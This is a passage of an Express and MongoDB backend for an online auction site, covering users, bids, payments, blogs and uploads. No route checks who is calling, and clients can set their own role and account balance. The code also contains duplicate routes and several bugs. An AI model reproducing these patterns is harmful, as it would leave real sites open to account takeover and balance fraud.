    app.post("/logout", (req, res) => {
      res
        .clearCookie("token", { httpOnly: true, secure: false })
        .send({ success: true });
    });

    // Seller Request APIs
    app.get("/sellerRequest/:becomeSellerStatus", async (req, res) => {
      try {
        const becomeSellerStatus = req.params.becomeSellerStatus;
        const users = await SellerRequestCollection.find({
          becomeSellerStatus,
        }).toArray();
        if (!users.length)
          return res.status(404).json({ message: "Users not found" });
        res.json(users);
      } catch (error) {
        console.error("Error fetching seller requests:", error);
        res.status(500).json({ message: "Internal server error!" });
      }
    });

    app.get("/sellerRequest", async (req, res) => {
      try {
        const users = await SellerRequestCollection.find().toArray();
        res.send(users);
      } catch (error) {
        res.status(500).send("Internal server error!");
      }
    });

    app.post("/become_seller", async (req, res) => {
      const requestData = req.body;
      const result = await SellerRequestCollection.insertOne(requestData);
      res.send({ success: true, result });
    });

    app.delete("/sellerRequest/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await SellerRequestCollection.deleteOne(query);
      if (result.deletedCount > 0) {
        res.send({
          success: true,
          message: "Seller request deleted successfully!",
        });
      } else {
        res
          .status(404)
          .send({ success: false, message: "Seller request not found!" });
      }
    });

    app.patch("/sellerRequest/:id", async (req, res) => {
      const userId = req.params.id;
      const { becomeSellerStatus } = req.body;
      if (!becomeSellerStatus) {
        return res
          .status(400)
          .send({ success: false, message: "Status is required!" });
      }
      const updatedUser = await SellerRequestCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { becomeSellerStatus } }
      );
      if (updatedUser.modifiedCount > 0) {
        res.send({
          success: true,
          message: "Seller status updated successfully!",
        });
      } else {
        res
          .status(404)
          .send({ success: false, message: "Seller request not found!" });
      }
    });

    // User APIs
    app.get("/users", async (req, res) => {
      const users = await userCollection.find().toArray();
      res.send(users);
    });

    app.get("/bid-history/:email", async (req, res) => {
      try {
        const { email } = req.params;
        const user = await userCollection.findOne({ email });

        if (!user?.recentActivity || user.recentActivity.length === 0) {
          return res.status(200).json([]);
        }

        const auctIDs = user.recentActivity.map(
          (item) => new ObjectId(item.auctionId)
        );

        const auctions = await auctionCollection
          .find({ _id: { $in: auctIDs } })
          .toArray();

        const now = new Date();

        const bidHistory = auctions.map((auction) => {
          const endTime = new Date(auction.endTime);
          const bids = auction.bids || [];

          const recentActivity = user.recentActivity.find(
            (activity) =>
              activity.auctionId.toString() === auction._id.toString()
          );

          const recentBidAmount = recentActivity?.amount || 0;
          const bidTime = recentActivity?.time || "N/A";

          const userBids = bids.filter((bid) => bid.email === email);
          const highestUserBid = Math.max(
            recentBidAmount,
            ...userBids.map((bid) => bid.amount)
          );

          const sortedTopBidders = [...(auction.topBidders || [])].sort(
            (a, b) => b.amount - a.amount
          );

          let userPosition = "N/A";
          if (highestUserBid > 0) {
            const uniqueAmounts = [
              ...new Set(sortedTopBidders.map((bidder) => bidder.amount)),
            ];
            const positionIndex = uniqueAmounts.indexOf(highestUserBid);
            if (positionIndex !== -1) {
              userPosition = positionIndex + 1;
            }
          }

          return {
            auctionId: auction._id,
            auctionTitle: auction.name,
            auctionImage: auction.images?.[0] || "",
            bidAmount: highestUserBid,
            time: bidTime,
            status: endTime < now ? "End" : "Live",
            position: userPosition,
            topBiddersLength: sortedTopBidders.length,
          };
        });

        res.status(200).json(bidHistory);
      } catch (error) {
        console.error("Error fetching bid history:", error);
        res.status(500).json({ error: "Internal server error" });
      }
    });

    app.get("/user/:email", async (req, res) => {
      try {
        const email = req.params.email;
        const user = await userCollection.findOne({ email });
        if (!user) return res.status(404).json({ message: "User not found" });
        res.json(user);
      } catch (error) {
        console.error("Error fetching user:", error);
        res.status(500).json({ message: "Internal server error!" });
      }
    });

    app.post("/users", async (req, res) => {
      const user = req.body;
      const query = { email: user.email };
      const existingUser = await userCollection.findOne(query);
      if (existingUser) return res.status(201).send(existingUser);
      const result = await userCollection.insertOne(user);
      res.status(201).send(result);
    });

    app.patch("/users/:id", async (req, res) => {
      const userId = req.params.id;
      const { role } = req.body;
      if (!role) {
        return res
          .status(400)
          .send({ success: false, message: "Role is required!" });
      }
      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { role } }
      );
      if (updatedUser.modifiedCount > 0) {
        res.send({ success: true, message: "User role updated successfully!" });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or role not changed!",
        });
      }
    });

    app.delete("/users/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await userCollection.deleteOne(query);
      if (result.deletedCount > 0) {
        res.send({ success: true, message: "User deleted successfully!" });
      } else {
        res.status(404).send({ success: false, message: "User not found!" });
      }
    });

    // Announcement APIs
    app.get("/announcement", async (req, res) => {
      const result = await announcementCollection.find().toArray();
      res.send(result);
    });

    app.post("/announcement", async (req, res) => {
      const announcementData = req.body;
      const result = await announcementCollection.insertOne(announcementData);
      res.send({ success: true, result });
    });

    app.delete("/announcement/:id", async (req, res) => {
      const id = req.params.id;
      const filter = { _id: new ObjectId(id) };
      const result = await announcementCollection.deleteOne(filter);
      res.send(result);
    });

    app.put("/announcement/:id", async (req, res) => {
      const { title, content, date, image } = req.body;
      const announcementId = req.params.id;
      try {
        const result = await announcementCollection.updateOne(
          { _id: new ObjectId(announcementId) },
          { $set: { title, content, date, image } }
        );
        if (result.matchedCount === 0) {
          return res.status(404).json({ message: "Announcement not found" });
        }
        res.status(200).json({ message: "Announcement updated successfully" });
      } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Failed to update the announcement" });
      }
    });

    // Auction APIs
    app.get("/auction/:id", async (req, res) => {
      const { id } = req.params;
      try {
        const query = { _id: new ObjectId(id) };
        const result = await auctionCollection.findOne(query);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch Auction", error });
      }
    });

    app.get("/auctions", async (req, res) => {
      try {
        const { email } = req.query;
        if (email) {
          const auctions = await auctionCollection
            .find({ sellerEmail: email })
            .toArray();
          res.send(auctions);
        } else {
          const result = await auctionCollection.find().toArray();
          res.send(result);
        }
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    //Upcoming Auction
    app.get("/upcoming-auctions", async (req, res) => {
      try {
        const result = await auctionCollection.find().toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    app.post("/auctions", async (req, res) => {
      const auction = req.body;
      const result = await auctionCollection.insertOne(auction);
      res.send(result);
    });
    app.patch("/auctions/payment/:id", async (req, res) => {
      try {
        const { id } = req.params;
        const { payment, paymentDetails } = req.body;

        if (!payment) {
          return res.status(400).send({
            success: false,
            message: "Payment status is required",
          });
        }

        const filter = { _id: new ObjectId(id) };
        const updateDoc = {
          $set: {
            payment,
            paymentDetails,
            paymentDate: new Date(),
          },
        };

        const result = await auctionCollection.updateOne(filter, updateDoc);

        if (result.matchedCount === 0) {
          return res.status(404).send({
            success: false,
            message: "Auction not found",
          });
        }

        res.send({
          success: true,
          message: "Payment status updated successfully",
          result,
        });
      } catch (error) {
        console.error("Error updating payment status:", error);
        res.status(500).send({
          success: false,
          message: "Failed to update payment status",
          error: error.message,
        });
      }
    });
    app.patch("/auctions/:id", async (req, res) => {
      const auctionId = req.params.id;
      const { status, deliveryStatus, notes } = req.body;

      const filter = { _id: new ObjectId(auctionId) };
      const updateFields = {};

      if (status) updateFields.status = status;
      if (deliveryStatus) updateFields.deliveryStatus = deliveryStatus;
      if (notes) updateFields.notes = notes;

      const updateDoc = { $set: updateFields };

      try {
        const result = await auctionCollection.updateOne(filter, updateDoc);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Update failed", error });
      }
    });

    app.delete("/auctions/:id", async (req, res) => {
      try {
        const id = req.params.id;
        const filter = { _id: new ObjectId(id) };
        const result = await auctionCollection.deleteOne(filter);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    //ended auctions api
    app.get("/endedAuctions", async (req, res) => {
      try {
        const result = await endedAuctionCollection.find().toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    app.post("/endedAuctions", async (req, res) => {
      try {
        const { auctionId } = req.body;
        const query = { _id: new ObjectId(auctionId) };

        // 1. Find the auction
        const auction = await auctionCollection.findOne(query);
        if (!auction) {
          return res.status(404).send({ message: "Auction not found" });
        }

        // 2. Delete it from current auctions
        await auctionCollection.deleteOne(query);

        // 3. Insert into endedAuctionCollection
        const insertResult = await endedAuctionCollection.insertOne(auction);

        res.send({ message: "Auction ended successfully", data: insertResult });
      } catch (error) {
        res.status(500).send({ message: "Internal server error", error });
      }
    });

    //auction er top bidders update

    app.patch("/auctionList/topBidders", async (req, res) => {
      try {
        const { topBidders } = req.body;

        if (
          !topBidders ||
          !Array.isArray(topBidders) ||
          topBidders.length === 0
        ) {
          return res
            .status(400)
            .send({ success: false, message: "Invalid topBidders data." });
        }

        const auctionId = topBidders[0]?.auctionId;

        if (!auctionId) {
          return res.status(400).send({
            success: false,
            message: "auctionId missing in topBidders.",
          });
        }

        const filter = { _id: new ObjectId(auctionId) };
        const updateDoc = {
          $set: {
            topBidders: topBidders,
          },
        };

        const result = await auctionCollection.updateOne(filter, updateDoc);

        res.send({
          success: true,
          message: "Top bidders updated successfully.",
          result,
        });
      } catch (error) {
        console.error("Error updating topBidders:", error);
        res.status(500).send({ success: false, message: "Server error." });
      }
    });

    // Specific user.accountBalance update
    app.patch("/accountBalance/:id", async (req, res) => {
      const userId = req.params.id;
      const { accountBalance, transaction } = req.body;

      if (!accountBalance && !transaction) {
        return res
          .status(400)
          .send({ success: false, message: "accountBalance is required!" });
      }

      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { accountBalance }, $push: { transactions: transaction } }
      );

      if (updatedUser.modifiedCount > 0) {
        res.send({
          success: true,
          message: "User accountBalance updated successfully!",
        });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or accountBalance not changed!",
        });
      }
    });

    // Specific user.recentActivity  update
    app.patch("/updateUserRecentActivity/:id", async (req, res) => {
      const userId = req.params.id;
      const { bidData } = req.body;

      if (!bidData) {
        return res
          .status(400)
          .send({ success: false, message: "valid data is required!" });
      }

      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $push: { recentActivity: bidData } }
      );

      if (updatedUser.modifiedCount > 0) {
        res.status(201).send({
          success: true,
          message: "User data updated successfully!",
        });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or data not changed!",
        });
      }
    });

    // Live Bidding APIs
    app.get("/live-bid/top", async (req, res) => {
      const { auctionId } = req.query;
      const query = auctionId ? { auctionId } : {};
      const result = await SpecificUserLiveBiddingCollection.aggregate([
        { $match: query },
        {
          $group: {
            _id: "$email",
            name: { $first: "$name" },
            photo: { $first: "$photo" },
            amount: { $max: "$amount" },
            auctionId: { $first: "$auctionId" },
          },
        },
        { $sort: { amount: -1 } },
        { $limit: 3 },
      ]).toArray();
      res.send(result);
    });

    app.get("/live-bid/recent", async (req, res) => {
      const { auctionId } = req.query;
      const query = auctionId ? { auctionId } : {};
      const result = await SpecificUserLiveBiddingCollection.find(query)
        .sort({ createdAt: -1 })
        .limit(3)
        .toArray();
      res.send(result);
    });

    app.post("/live-bid", async (req, res) => {
      const liveBid = req.body;
      liveBid.createdAt = new Date();
      const result = await SpecificUserLiveBiddingCollection.insertOne(liveBid);
      await auctionCollection.updateOne(
        { _id: new ObjectId(liveBid.auctionId) },
        { $set: { currentBid: liveBid.amount } }
      );
      res.send(result);
    });

    // Reports API
    app.post("/reports", async (req, res) => {
      try {
        const reports = req.body;
        const result = await reportsCollection.insertOne(reports);
        res.send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // GET a report(Joyeta)
    app.get("/reports", async (req, res) => {
      try {
        const reports = await reportCollection.find().toArray();
        res.send(reports);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to fetch reports", error: error.message });
      }
    });

    // POST a report (Joyeta)
    app.post("/reports", async (req, res) => {
      try {
        const report = req.body;

        if (!report || Object.keys(report).length === 0) {
          return res.status(400).send({ message: "Report data is required" });
        }

        const result = await reportCollection.insertOne(report);
        res.send(result);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to submit report", error: error.message });
      }
    });

    //feedback get method

    app.get("/feedbacks", async (req, res) => {
      try {
        const feedbacks = await feedbackCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    //feedback post api

    app.post("/feedback", async (req, res) => {
      try {
        const feedback = req.body;
        if (!feedback) {
          return res.status(400).send({ message: "Feedback data is required" });
        }
        const result = await feedbackCollection.insertOne(feedback);
        res.status(200).send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    // POST a report (Joyeta)
    app.post("/reports", async (req, res) => {
      try {
        const report = req.body;

        if (!report || Object.keys(report).length === 0) {
          return res.status(400).send({ message: "Report data is required" });
        }

        const result = await reportCollection.insertOne(report);
        res.send(result);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to submit report", error: error.message });
      }
    });

    //feedback get method

    app.get("/feedbacks", async (req, res) => {
      try {
        const feedbacks = await feedbackCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    //feedback post api

    app.post("/feedback", async (req, res) => {
      try {
        const feedback = req.body;
        if (!feedback) {
          return res.status(400).send({ message: "Feedback data is required" });
        }
        const result = await feedbackCollection.insertOne(feedback);
        res.status(200).send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // cover collection api
    // app.post("/cover", async (req, res) => {
    //   const feedback = req.body;

    //   const result = await CoverCollection.insertOne(feedback);
    //   res.status(200).send({ success: true, result });
    // });

    app.patch("/cover", async (req, res) => {
      const userId = req.params.id;
      const { cover } = req.body;
      const filter = { _id: new ObjectId(userId) };
      const updateDoc = { $set: { cover: cover } };
      const result = await userCollection.updateOne(filter, updateDoc);
      res.send(result);
    });
    // Update user profile
    app.patch("/user/:email", async (req, res) => {
      const email = req.params.email;
      const updates = req.body;
      // List of allowed fields to update
      const allowedFields = [
        "name",
        "email",
        "photo",
        "role",
        "AuctionsWon",
        "ActiveBids",
        "TotalSpent",
        "accountBalance",
        "BiddingHistory",
        "onGoingBid",
        "Location",
        "memberSince",
        "recentActivity",
        "watchingNow",
      ];

      // Filter updates to only include allowed fields
      const filteredUpdates = Object.keys(updates)
        .filter((key) => allowedFields.includes(key))
        .reduce((obj, key) => {
          obj[key] = updates[key];
          return obj;
        }, {});

      const filter = { email: email };
      const updateDoc = { $set: filteredUpdates };

      try {
        const result = await userCollection.updateOne(filter, updateDoc);
        if (result.matchedCount === 0) {
          return res.status(404).send({ message: "User not found" });
        }
        const updatedUser = await userCollection.findOne(filter);
        res.send(updatedUser);
      } catch (err) {
        res.status(500).send({ message: "Failed to update profile" });
      }
    });

    // Update cover photo
    app.patch("/cover/:id", async (req, res) => {
      const userId = req.params.id;
      const { cover } = req.body;
      const filter = { _id: new ObjectId(userId) };
      const updateDoc = { $set: { cover: cover } };
      try {
        const result = await userCollection.updateOne(filter, updateDoc);
        if (result.matchedCount === 0) {
          return res.status(404).send({ message: "User not found" });
        }
        const updatedUser = await userCollection.findOne(filter);
        res.send(updatedUser);
      } catch (err) {
        res.status(500).send({ message: "Failed to update cover" });
      }
    });

    // Upload photo
    app.post("/upload-photo", upload.single("photo"), async (req, res) => {
      try {
        const photo = req.file;
        if (!photo) {
          return res.status(400).send({ message: "No photo uploaded" });
        }
        // Upload to Cloudinary
        const uploadResult = await new Promise((resolve, reject) => {
          cloudinary.uploader
            .upload_stream({ resource_type: "image" }, (error, result) => {
              if (error) reject(error);
              else resolve(result);
            })
            .end(photo.buffer);
        });
        res.send({ url: uploadResult.secure_url });
      } catch (err) {
        res.status(500).send({ message: "Failed to upload photo" });
      }
    });

    app.get("/cover", async (req, res) => {
      try {
        const feedbacks = await CoverCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // app.get("/cover/:userId", async (req, res) => {
    //   try {
    //     const userId = req.query.userId; // Get userId from query parameters
    //     const query = { userId: userId };

    //     const result = await CoverCollection.findOne(query);
    //     if (result) {
    //       res.status(200).send(result);
    //     } else {
    //       res.status(404).send({ message: "Cover not found" });
    //     }
    //   } catch (error) {
    //     res.status(500).send({ message: "Internal server error", error });
    //   }
    // });
    // Debug endpoint to check active socket connections
    app.get("/debug/socket-connections", (req, res) => {
      const connections = Array.from(io.sockets.sockets).map(
        ([id, socket]) => ({
          id,
          rooms: Array.from(socket.rooms),
        })
      );

      res.json({
        activeConnections: connections.length,
        connections,
      });
    });

    app.get("/allBlogs", async (req, res) => {
      try {
        const blogs = await blogCollection.find().toArray(); // Adjust to your actual schema or data retrieval method

        if (!blogs || blogs.length === 0) {
          return res
            .status(404)
            .json({ message: "No blogs found for this email." });
        }

        res.status(200).json(blogs); // Respond with the blogs
      } catch (error) {
        console.error(error);
        res
          .status(500)
          .json({ message: "Server error, please try again later." });
      }
    });

    app.get("/blogs/:email", async (req, res) => {
      const email = req.params.email; // Extract email parameter from URL

      try {
        const query = { authorEmail: email };
        const blogs = await blogCollection.find(query).toArray(); // Adjust to your actual schema or data retrieval method

        if (!blogs || blogs.length === 0) {
          return res
            .status(404)
            .json({ message: "No blogs found for this email." });
        }

        res.status(200).json(blogs); // Respond with the blogs
      } catch (error) {
        console.error(error);
        res
          .status(500)
          .json({ message: "Server error, please try again later." });
      }
    });

    app.get("/blog/:id", async (req, res) => {
      const { id } = req.params;
      try {
        const blog = await blogCollection.findOne({ _id: new ObjectId(id) });
        if (!blog) {
          return res.status(404).json({ message: "Blog not found" });
        }
        res.json(blog);
      } catch (error) {
        res.status(500).json({ message: "Error fetching blog" });
      }
    });

    app.post("/addBlogs", async (req, res) => {
      try {
        const { title, imageUrls, fullContent } = req.body;

        if (!title || !imageUrls.length || !fullContent) {
          return res.status(400).json({ message: "All fields are required." });
        }
        const blog = req.body;

        const newBlog = {
          ...blog,
          createdAt: new Date(),
        };

        const result = await blogCollection.insertOne(newBlog);

        if (result.insertedId) {
          res.status(201).json({
            message: "Blog created successfully",
            blogId: result.insertedId,
          });
        } else {
          res.status(500).json({ message: "Failed to create blog." });
        }
      } catch (error) {
        console.error("Error in /add-blogs:", error);
        res.status(500).json({ message: "Internal Server Error" });
      }
    });

    // Ensure that the route matches the one you're calling in the frontend

    app.patch("/updateBlog/:id", async (req, res) => {
      const { id } = req.params;
      const { title, fullContent, imageUrls } = req.body;

      try {
        const result = await blogCollection.updateOne(
          { _id: new ObjectId(id) }, // match document by id
          {
            $set: {
              title,
              fullContent,
              imageUrls: imageUrls || [],
            },
          }
        );

        if (result.matchedCount === 0) {
          return res
            .status(404)
            .json({ success: false, message: "Blog not found" });
        }

        res.json({ success: true, message: "Blog updated successfully" });
      } catch (error) {
        console.error("Error updating blog:", error);
        res.status(500).json({
          success: false,
          message: "Server Error",
          error: error.message,
        });
      }
    });

    app.delete("/delete/:id", async (req, res) => {
      const { id } = req.params; // Extract the blog post ID from the URL parameter

      try {
        // Attempt to delete the blog post by its ID from the database
        const result = await blogCollection.deleteOne({
          _id: new ObjectId(id),
        });

        // Check if the blog post was found and deleted
        if (result.deletedCount === 0) {
          return res.status(404).json({ message: "Blog post not found." });
        }

        // Respond with a success message if the deletion is successful
        res.status(200).json({ message: "Blog post deleted successfully." });
      } catch (error) {
        console.error("Error deleting blog post:", error);
        res.status(500).json({ message: "Internal Server Error" });
      }
    });
  } finally {
  }
}
run().catch(console.dir);

app.get("/", (req, res) => {
  res.send("RexAuction Running with Socket.IO!");
});

server.listen(port, () => {
  console.log(`Running on port ${port}`);
});
